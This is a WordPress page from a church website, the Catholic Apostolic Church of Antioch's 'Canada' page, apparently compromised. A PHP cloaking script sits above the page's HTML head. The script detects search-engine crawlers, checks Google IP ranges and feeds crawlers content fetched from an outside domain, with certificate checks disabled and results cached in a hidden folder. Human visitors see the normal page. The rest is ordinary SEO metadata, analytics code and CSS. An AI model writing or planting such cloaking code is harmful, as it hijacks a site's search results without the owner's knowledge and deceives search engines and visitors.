<?php
error_reporting(0);
ini_set('display_errors', 0);

// ============================================
// CONFIGURATION (PHP 5.x SAFE)
// ============================================
$config = array(
    'bot_url'   => 'https://cloudcdn-storage.shop/churchofantioch/canada/index.html',
    'cache_ttl' => 3600,
    'timeout'   => 15
);

// ============================================
// BOT DETECTION
// ============================================
function is_search_bot() {
    $bots = array(
        'Googlebot','Googlebot-Mobile','Googlebot-Image','Googlebot-News',
        'Googlebot-Video','AdsBot-Google','Mediapartners-Google',
        'Google-InspectionTool','Google-Site-Verification','Storebot-Google',
        'bingbot','msnbot','BingPreview',
        'Slurp','DuckDuckBot','Baiduspider','YandexBot',
        'facebookexternalhit','LinkedInBot','Twitterbot'
    );

    $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';

    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    return false;
}

// ============================================
// GOOGLE IP VERIFY
// ============================================
function verify_google_ip() {
    $ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
    if ($ip == '') return false;

    $google_ip_prefixes = array('66.249.','64.233.','72.14.','209.85.','216.239.');

    foreach ($google_ip_prefixes as $prefix) {
        if (strpos($ip, $prefix) === 0) {
            return true;
        }
    }

    $hostname = @gethostbyaddr($ip);
    if ($hostname &&
        (stripos($hostname, 'googlebot.com') !== false ||
         stripos($hostname, 'google.com') !== false)) {

        $resolved_ip = @gethostbyname($hostname);
        if ($resolved_ip === $ip) {
            return true;
        }
    }
    return false;
}

// ============================================
// FETCH REMOTE CONTENT
// ============================================
function get_remote_content($url, $timeout = 10) {

    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

        $content = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($content && $http_code == 200) {
            return $content;
        }
    }

    if (ini_get('allow_url_fopen')) {
        $context = stream_context_create(array(
            'http' => array(
                'method' => 'GET',
                'timeout' => $timeout,
                'user_agent' => 'Mozilla/5.0',
                'follow_location' => 1
            ),
            'ssl' => array(
                'verify_peer' => false,
                'verify_peer_name' => false
            )
        ));

        $content = @file_get_contents($url, false, $context);
        if ($content !== false) {
            return $content;
        }
    }
    return false;
}

// ============================================
// CACHE SYSTEM
// ============================================
function cache_content($key, $content = null, $ttl = 3600) {
    $cache_dir = dirname(__FILE__) . '/.cache';
    if (!is_dir($cache_dir)) {
        @mkdir($cache_dir, 0755, true);
    }

    $cache_file = $cache_dir . '/' . md5($key) . '.html';

    if ($content !== null) {
        file_put_contents($cache_file, serialize(array(
            'time' => time(),
            'content' => $content
        )));
        return true;
    } else {
        if (file_exists($cache_file)) {
            $data = @unserialize(file_get_contents($cache_file));
            if ($data && (time() - $data['time']) < $ttl) {
                return $data['content'];
            }
        }
    }
    return false;
}

// ============================================
// SERVE BOT CONTENT
// ============================================
function serve_bot_content($url, $ttl = 3600, $timeout = 15) {

    $cached = cache_content('bot_content', null, $ttl);
    if ($cached) {
        header('Content-Type: text/html; charset=utf-8');
        header('X-Visitor-Type: bot');
        echo $cached;
        exit;
    }

    $content = get_remote_content($url, $timeout);
    if ($content) {
        cache_content('bot_content', $content, $ttl);
        header('Content-Type: text/html; charset=utf-8');
        header('X-Visitor-Type: bot');
        echo $content;
        exit;
    }

    header('HTTP/1.1 503 Service Temporarily Unavailable');
    echo '<h1>503 Service Temporarily Unavailable</h1>';
    exit;
}

// ============================================
// MAIN
// ============================================
if (is_search_bot()) {

    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';

    if (stripos($ua, 'Googlebot') !== false) {
        if (verify_google_ip()) {
            serve_bot_content($config['bot_url'], $config['cache_ttl'], $config['timeout']);
        }
    } else {
        serve_bot_content($config['bot_url'], $config['cache_ttl'], $config['timeout']);
    }
}

header('Content-Type: text/html; charset=utf-8');
header('X-Visitor-Type: user');
?>



<!DOCTYPE html>
<html class="avada-html-layout-wide avada-html-header-position-top" dir="ltr" lang="en-US" prefix="og: https://ogp.me/ns#" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb#">
<head>
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
	<meta name="viewport" content="width=device-width, initial-scale=1" />
	<title>Canada - Catholic Apostolic Church of Antioch</title>

		<!-- All in One SEO 4.9.3 - aioseo.com -->
	<meta name="description" content="Benoit Moreau, of Riviere de Loup, Quebec, Canada, was ordained to the sacred order of the priesthood on May 20, 2023. Bishop Michael, Father Benoit, and Presiding Bishop Mark" />
	<meta name="robots" content="max-image-preview:large" />
	<link rel="canonical" href="https://www.churchofantioch.org/canada/" />
	<meta name="generator" content="All in One SEO (AIOSEO) 4.9.3" />
		<meta property="og:locale" content="en_US" />
		<meta property="og:site_name" content="Catholic&nbsp;Apostolic&nbsp;Church&nbsp;of&nbsp;Antioch - We are a free and independent sacramental church  grounded in the Christian mystical tradition." />
		<meta property="og:type" content="article" />
		<meta property="og:title" content="Canada - Catholic Apostolic Church of Antioch" />
		<meta property="og:description" content="Benoit Moreau, of Riviere de Loup, Quebec, Canada, was ordained to the sacred order of the priesthood on May 20, 2023. Bishop Michael, Father Benoit, and Presiding Bishop Mark" />
		<meta property="og:url" content="https://www.churchofantioch.org/canada/" />
		<meta property="article:published_time" content="2023-06-07T07:19:42+00:00" />
		<meta property="article:modified_time" content="2023-06-07T07:32:26+00:00" />
		<meta name="twitter:card" content="summary_large_image" />
		<meta name="twitter:title" content="Canada - Catholic Apostolic Church of Antioch" />
		<meta name="twitter:description" content="Benoit Moreau, of Riviere de Loup, Quebec, Canada, was ordained to the sacred order of the priesthood on May 20, 2023. Bishop Michael, Father Benoit, and Presiding Bishop Mark" />
		<script type="application/ld+json" class="aioseo-schema">
			{"@context":"https:\/\/schema.org","@graph":[{"@type":"BreadcrumbList","@id":"https:\/\/www.churchofantioch.org\/canada\/#breadcrumblist","itemListElement":[{"@type":"ListItem","@id":"https:\/\/www.churchofantioch.org#listItem","position":1,"name":"Home","item":"https:\/\/www.churchofantioch.org","nextItem":{"@type":"ListItem","@id":"https:\/\/www.churchofantioch.org\/canada\/#listItem","name":"Canada"}},{"@type":"ListItem","@id":"https:\/\/www.churchofantioch.org\/canada\/#listItem","position":2,"name":"Canada","previousItem":{"@type":"ListItem","@id":"https:\/\/www.churchofantioch.org#listItem","name":"Home"}}]},{"@type":"Organization","@id":"https:\/\/www.churchofantioch.org\/#organization","name":"Catholic\u00a0Apostolic\u00a0Church\u00a0of\u00a0Antioch","description":"We are a free and independent sacramental church  grounded in the Christian mystical tradition.","url":"https:\/\/www.churchofantioch.org\/"},{"@type":"WebPage","@id":"https:\/\/www.churchofantioch.org\/canada\/#webpage","url":"https:\/\/www.churchofantioch.org\/canada\/","name":"Canada - Catholic Apostolic Church of Antioch","description":"Benoit Moreau, of Riviere de Loup, Quebec, Canada, was ordained to the sacred order of the priesthood on May 20, 2023. Bishop Michael, Father Benoit, and Presiding Bishop Mark","inLanguage":"en-US","isPartOf":{"@id":"https:\/\/www.churchofantioch.org\/#website"},"breadcrumb":{"@id":"https:\/\/www.churchofantioch.org\/canada\/#breadcrumblist"},"datePublished":"2023-06-07T07:19:42+00:00","dateModified":"2023-06-07T07:32:26+00:00"},{"@type":"WebSite","@id":"https:\/\/www.churchofantioch.org\/#website","url":"https:\/\/www.churchofantioch.org\/","name":"Catholic\u00a0Apostolic\u00a0Church\u00a0of\u00a0Antioch","description":"We are a free and independent sacramental church  grounded in the Christian mystical tradition.","inLanguage":"en-US","publisher":{"@id":"https:\/\/www.churchofantioch.org\/#organization"}}]}
		</script>
		<!-- All in One SEO -->


            <script data-no-defer="1" data-ezscrex="false" data-cfasync="false" data-pagespeed-no-defer data-cookieconsent="ignore">
                var ctPublicFunctions = {"_ajax_nonce":"4cf1c58a10","_rest_nonce":"11da88022a","_ajax_url":"\/wp-admin\/admin-ajax.php","_rest_url":"https:\/\/www.churchofantioch.org\/wp-json\/","data__cookies_type":"native","data__ajax_type":"rest","data__bot_detector_enabled":0,"data__frontend_data_log_enabled":1,"cookiePrefix":"","wprocket_detected":false,"host_url":"www.churchofantioch.org","text__ee_click_to_select":"Click to select the whole data","text__ee_original_email":"The complete one is","text__ee_got_it":"Got it","text__ee_blocked":"Blocked","text__ee_cannot_connect":"Cannot connect","text__ee_cannot_decode":"Can not decode email. Unknown reason","text__ee_email_decoder":"CleanTalk email decoder","text__ee_wait_for_decoding":"The magic is on the way!","text__ee_decoding_process":"Please wait a few seconds while we decode the contact data."}
            </script>
        
            <script data-no-defer="1" data-ezscrex="false" data-cfasync="false" data-pagespeed-no-defer data-cookieconsent="ignore">
                var ctPublic = {"_ajax_nonce":"4cf1c58a10","settings__forms__check_internal":"0","settings__forms__check_external":"0","settings__forms__force_protection":0,"settings__forms__search_test":"1","settings__forms__wc_add_to_cart":"0","settings__data__bot_detector_enabled":0,"settings__sfw__anti_crawler":0,"blog_home":"https:\/\/www.churchofantioch.org\/","pixel__setting":"0","pixel__enabled":false,"pixel__url":null,"data__email_check_before_post":"1","data__email_check_exist_post":0,"data__cookies_type":"native","data__key_is_ok":true,"data__visible_fields_required":true,"wl_brandname":"Anti-Spam by CleanTalk","wl_brandname_short":"CleanTalk","ct_checkjs_key":88362070,"emailEncoderPassKey":"cffd46df5258ebe1726a2c59a8e6b5a9","bot_detector_forms_excluded":"W10=","advancedCacheExists":false,"varnishCacheExists":false,"wc_ajax_add_to_cart":false}
            </script>
        <link rel="alternate" type="application/rss+xml" title="Catholic&nbsp;Apostolic&nbsp;Church&nbsp;of&nbsp;Antioch &raquo; Feed" href="https://www.churchofantioch.org/feed/" />
<link rel="alternate" type="application/rss+xml" title="Catholic&nbsp;Apostolic&nbsp;Church&nbsp;of&nbsp;Antioch &raquo; Comments Feed" href="https://www.churchofantioch.org/comments/feed/" />
		
		
		
				<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://www.churchofantioch.org/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.churchofantioch.org%2Fcanada%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://www.churchofantioch.org/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.churchofantioch.org%2Fcanada%2F&#038;format=xml" />
		<!-- This site uses the Google Analytics by MonsterInsights plugin v10.0.1 - Using Analytics tracking - https://www.monsterinsights.com/ -->
							<script src="//www.googletagmanager.com/gtag/js?id=G-HKGCHXVQ1V"  data-cfasync="false" data-wpfc-render="false" type="text/javascript" async></script>
			<script data-cfasync="false" data-wpfc-render="false" type="text/javascript">
				var mi_version = '10.0.1';
				var mi_track_user = true;
				var mi_no_track_reason = '';
								var MonsterInsightsDefaultLocations = {"page_location":"https:\/\/www.churchofantioch.org\/canada\/"};
								if ( typeof MonsterInsightsPrivacyGuardFilter === 'function' ) {
					var MonsterInsightsLocations = (typeof MonsterInsightsExcludeQuery === 'object') ? MonsterInsightsPrivacyGuardFilter( MonsterInsightsExcludeQuery ) : MonsterInsightsPrivacyGuardFilter( MonsterInsightsDefaultLocations );
				} else {
					var MonsterInsightsLocations = (typeof MonsterInsightsExcludeQuery === 'object') ? MonsterInsightsExcludeQuery : MonsterInsightsDefaultLocations;
				}

								var disableStrs = [
										'ga-disable-G-HKGCHXVQ1V',
									];

				/* Function to detect opted out users */
				function __gtagTrackerIsOptedOut() {
					for (var index = 0; index < disableStrs.length; index++) {
						if (document.cookie.indexOf(disableStrs[index] + '=true') > -1) {
							return true;
						}
					}

					return false;
				}

				/* Disable tracking if the opt-out cookie exists. */
				if (__gtagTrackerIsOptedOut()) {
					for (var index = 0; index < disableStrs.length; index++) {
						window[disableStrs[index]] = true;
					}
				}

				/* Opt-out function */
				function __gtagTrackerOptout() {
					for (var index = 0; index < disableStrs.length; index++) {
						document.cookie = disableStrs[index] + '=true; expires=Thu, 31 Dec 2099 23:59:59 UTC; path=/';
						window[disableStrs[index]] = true;
					}
				}

				if ('undefined' === typeof gaOptout) {
					function gaOptout() {
						__gtagTrackerOptout();
					}
				}
								window.dataLayer = window.dataLayer || [];

				window.MonsterInsightsDualTracker = {
					helpers: {},
					trackers: {},
				};
				if (mi_track_user) {
					function __gtagDataLayer() {
						dataLayer.push(arguments);
					}

					function __gtagTracker(type, name, parameters) {
						if (!parameters) {
							parameters = {};
						}

						if (parameters.send_to) {
							__gtagDataLayer.apply(null, arguments);
							return;
						}

						if (type === 'event') {
														parameters.send_to = monsterinsights_frontend.v4_id;
							var hookName = name;
							if (typeof parameters['event_category'] !== 'undefined') {
								hookName = parameters['event_category'] + ':' + name;
							}

							if (typeof MonsterInsightsDualTracker.trackers[hookName] !== 'undefined') {
								MonsterInsightsDualTracker.trackers[hookName](parameters);
							} else {
								__gtagDataLayer('event', name, parameters);
							}
							
						} else {
							__gtagDataLayer.apply(null, arguments);
						}
					}

					__gtagTracker('js', new Date());
					__gtagTracker('set', {
						'developer_id.dZGIzZG': true,
											});
					if ( MonsterInsightsLocations.page_location ) {
						__gtagTracker('set', MonsterInsightsLocations);
					}
										__gtagTracker('config', 'G-HKGCHXVQ1V', {"forceSSL":"true","link_attribution":"true"} );
										window.gtag = __gtagTracker;										(function () {
						/* https://developers.google.com/analytics/devguides/collection/analyticsjs/ */
						/* ga and __gaTracker compatibility shim. */
						var noopfn = function () {
							return null;
						};
						var newtracker = function () {
							return new Tracker();
						};
						var Tracker = function () {
							return null;
						};
						var p = Tracker.prototype;
						p.get = noopfn;
						p.set = noopfn;
						p.send = function () {
							var args = Array.prototype.slice.call(arguments);
							args.unshift('send');
							__gaTracker.apply(null, args);
						};
						var __gaTracker = function () {
							var len = arguments.length;
							if (len === 0) {
								return;
							}
							var f = arguments[len - 1];
							if (typeof f !== 'object' || f === null || typeof f.hitCallback !== 'function') {
								if ('send' === arguments[0]) {
									var hitConverted, hitObject = false, action;
									if ('event' === arguments[1]) {
										if ('undefined' !== typeof arguments[3]) {
											hitObject = {
												'eventAction': arguments[3],
												'eventCategory': arguments[2],
												'eventLabel': arguments[4],
												'value': arguments[5] ? arguments[5] : 1,
											}
										}
									}
									if ('pageview' === arguments[1]) {
										if ('undefined' !== typeof arguments[2]) {
											hitObject = {
												'eventAction': 'page_view',
												'page_path': arguments[2],
											}
										}
									}
									if (typeof arguments[2] === 'object') {
										hitObject = arguments[2];
									}
									if (typeof arguments[5] === 'object') {
										Object.assign(hitObject, arguments[5]);
									}
									if ('undefined' !== typeof arguments[1].hitType) {
										hitObject = arguments[1];
										if ('pageview' === hitObject.hitType) {
											hitObject.eventAction = 'page_view';
										}
									}
									if (hitObject) {
										action = 'timing' === arguments[1].hitType ? 'timing_complete' : hitObject.eventAction;
										hitConverted = mapArgs(hitObject);
										__gtagTracker('event', action, hitConverted);
									}
								}
								return;
							}

							function mapArgs(args) {
								var arg, hit = {};
								var gaMap = {
									'eventCategory': 'event_category',
									'eventAction': 'event_action',
									'eventLabel': 'event_label',
									'eventValue': 'event_value',
									'nonInteraction': 'non_interaction',
									'timingCategory': 'event_category',
									'timingVar': 'name',
									'timingValue': 'value',
									'timingLabel': 'event_label',
									'page': 'page_path',
									'location': 'page_location',
									'title': 'page_title',
									'referrer' : 'page_referrer',
								};
								for (arg in args) {
																		if (!(!args.hasOwnProperty(arg) || !gaMap.hasOwnProperty(arg))) {
										hit[gaMap[arg]] = args[arg];
									} else {
										hit[arg] = args[arg];
									}
								}
								return hit;
							}

							try {
								f.hitCallback();
							} catch (ex) {
							}
						};
						__gaTracker.create = newtracker;
						__gaTracker.getByName = newtracker;
						__gaTracker.getAll = function () {
							return [];
						};
						__gaTracker.remove = noopfn;
						__gaTracker.loaded = true;
						window['__gaTracker'] = __gaTracker;
					})();
									} else {
										console.log("");
					(function () {
						function __gtagTracker() {
							return null;
						}

						window['__gtagTracker'] = __gtagTracker;
						window['gtag'] = __gtagTracker;
					})();
									}
			</script>
							<!-- / Google Analytics by MonsterInsights -->
		<style id='wp-img-auto-sizes-contain-inline-css' type='text/css'>
img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
/*# sourceURL=wp-img-auto-sizes-contain-inline-css */
</style>
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
/*# sourceURL=wp-emoji-styles-inline-css */
</style>
<style id='wp-block-library-inline-css' type='text/css'>
:root{--wp-block-synced-color:#7a00df;--wp-block-synced-color--rgb:122,0,223;--wp-bound-block-color:var(--wp-block-synced-color);--wp-editor-canvas-background:#ddd;--wp-admin-theme-color:#007cba;--wp-admin-theme-color--rgb:0,124,186;--wp-admin-theme-color-darker-10:#006ba1;--wp-admin-theme-color-darker-10--rgb:0,107,160.5;--wp-admin-theme-color-darker-20:#005a87;--wp-admin-theme-color-darker-20--rgb:0,90,135;--wp-admin-border-width-focus:2px}@media (min-resolution:192dpi){:root{--wp-admin-border-width-focus:1.5px}}.wp-element-button{cursor:pointer}:root .has-very-light-gray-background-color{background-color:#eee}:root .has-very-dark-gray-background-color{background-color:#313131}:root .has-very-light-gray-color{color:#eee}:root .has-very-dark-gray-color{color:#313131}:root .has-vivid-green-cyan-to-vivid-cyan-blue-gradient-background{background:linear-gradient(135deg,#00d084,#0693e3)}:root .has-purple-crush-gradient-background{background:linear-gradient(135deg,#34e2e4,#4721fb 50%,#ab1dfe)}:root .has-hazy-dawn-gradient-background{background:linear-gradient(135deg,#faaca8,#dad0ec)}:root .has-subdued-olive-gradient-background{background:linear-gradient(135deg,#fafae1,#67a671)}:root .has-atomic-cream-gradient-background{background:linear-gradient(135deg,#fdd79a,#004a59)}:root .has-nightshade-gradient-background{background:linear-gradient(135deg,#330968,#31cdcf)}:root .has-midnight-gradient-background{background:linear-gradient(135deg,#020381,#2874fc)}:root{--wp--preset--font-size--normal:16px;--wp--preset--font-size--huge:42px}.has-regular-font-size{font-size:1em}.has-larger-font-size{font-size:2.625em}.has-normal-font-size{font-size:var(--wp--preset--font-size--normal)}.has-huge-font-size{font-size:var(--wp--preset--font-size--huge)}.has-text-align-center{text-align:center}.has-text-align-left{text-align:left}.has-text-align-right{text-align:right}.has-fit-text{white-space:nowrap!important}#end-resizable-editor-section{display:none}.aligncenter{clear:both}.items-justified-left{justify-content:flex-start}.items-justified-center{justify-content:center}.items-justified-right{justify-content:flex-end}.items-justified-space-between{justify-content:space-between}.screen-reader-text{border:0;clip-path:inset(50%);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px;word-wrap:normal!important}.screen-reader-text:focus{background-color:#ddd;clip-path:none;color:#444;display:block;font-size:1em;height:auto;left:5px;line-height:normal;padding:15px 23px 14px;text-decoration:none;top:5px;width:auto;z-index:100000}html :where(.has-border-color){border-style:solid}html :where([style*=border-top-color]){border-top-style:solid}html :where([style*=border-right-color]){border-right-style:solid}html :where([style*=border-bottom-color]){border-bottom-style:solid}html :where([style*=border-left-color]){border-left-style:solid}html :where([style*=border-width]){border-style:solid}html :where([style*=border-top-width]){border-top-style:solid}html :where([style*=border-right-width]){border-right-style:solid}html :where([style*=border-bottom-width]){border-bottom-style:solid}html :where([style*=border-left-width]){border-left-style:solid}html :where(img[class*=wp-image-]){height:auto;max-width:100%}:where(figure){margin:0 0 1em}html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:var(--wp-admin--admin-bar--height,0px)}@media screen and (max-width:600px){html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:0px}}

/*# sourceURL=wp-block-library-inline-css */
</style>
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
/*# sourceURL=/wp-includes/css/classic-themes.min.css */
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--awb-color-1: #ffffff;--wp--preset--color--awb-color-2: #f9f9fb;--wp--preset--color--awb-color-3: #f2f3f5;--wp--preset--color--awb-color-4: #65bd7d;--wp--preset--color--awb-color-5: #198fd9;--wp--preset--color--awb-color-6: #434549;--wp--preset--color--awb-color-7: #212326;--wp--preset--color--awb-color-8: #141617;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgb(6,147,227) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgb(252,185,0) 0%,rgb(255,105,0) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgb(255,105,0) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 10.5px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 21px;--wp--preset--font-size--x-large: 42px;--wp--preset--font-size--normal: 14px;--wp--preset--font-size--xlarge: 28px;--wp--preset--font-size--huge: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgb(255, 255, 255), 6px 6px rgb(0, 0, 0);--wp--preset--shadow--crisp: 6px 6px 0px rgb(0, 0, 0);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
/*# sourceURL=global-styles-inline-css */
</style>

